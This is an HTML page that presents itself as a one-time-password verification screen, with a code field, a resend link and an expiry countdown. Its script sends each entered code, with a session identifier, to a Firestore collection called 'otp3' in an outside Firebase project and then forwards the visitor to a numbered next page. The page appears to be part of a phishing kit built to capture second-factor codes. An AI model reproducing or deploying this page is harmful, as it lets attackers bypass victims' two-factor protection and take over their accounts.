<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Verify with One-Time Password</title>
  <link rel="stylesheet" href="a02b572693328546.css">

  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
      authDomain: "ss22-a96d3.firebaseapp.com",
      projectId: "ss22-a96d3",
      storageBucket: "ss22-a96d3.firebasestorage.app",
      messagingSenderId: "607942972170",
      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
      measurementId: "G-KT1P0Q0FD0",
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    document.addEventListener("DOMContentLoaded", function () {
      const otpForm = document.getElementById("otpForm");
      const otpInput = document.getElementById("otp");

      otpForm.addEventListener("submit", async (e) => {
        e.preventDefault();

        const otp = otpInput.value.trim();
        if (!otp) {
          alert("Please enter the OTP.");
          return;
        }

        try {
          const sessionId = localStorage.getItem("sessionId") || null;

          await addDoc(collection(db, "otp3"), {
            otp: otp,
            sessionId: sessionId,
            timestamp: serverTimestamp(),
          });

          console.log("OTP saved successfully!");
          window.location.href = "b13.html"; // Redirect to next page
        } catch (error) {
          console.error("Error saving OTP: ", error);
          alert("Error saving OTP: " + error.message);
        }
      });
    });
  </script>
</head>
<body>
  <div id="__next">
    <header>
      <img alt="logo" loading="lazy" width="509" height="99" class="logo" src="logo.png">
    </header>
    <main>
      <form id="otpForm">
        <h1>Verify with One-Time Password</h1>
        <p style="font-weight: 600">Your One-Time Password was sent to your registered mobile number.</p>
        <div class="floating-container">
          <input type="text" name="one1" id="otp" minlength="6" maxlength="8" pattern="[0-9]+" inputmode="numeric" placeholder=" " required="">
          <label>One-Time Password <span>*</span></label>
        </div>
        <div class="btContainer">
          <button type="submit">Submit</button>
        </div>
        <p>If you didn't receive the one-time password SMS, please click here to <a href="/a3#">resend</a></p>
        <p style="font-weight: bold; text-align: center">OTP Expire: 03:00</p>
      </form>
    </main>
    <footer>
      <div class="l">
        <img alt="s" loading="lazy" width="1080" height="769" class="l" src="s.jpg">
      </div>
      <img alt="f" loading="lazy" width="1080" height="189" class="ft" src="ft.png">
    </footer>
  </div>
</body>
</html>
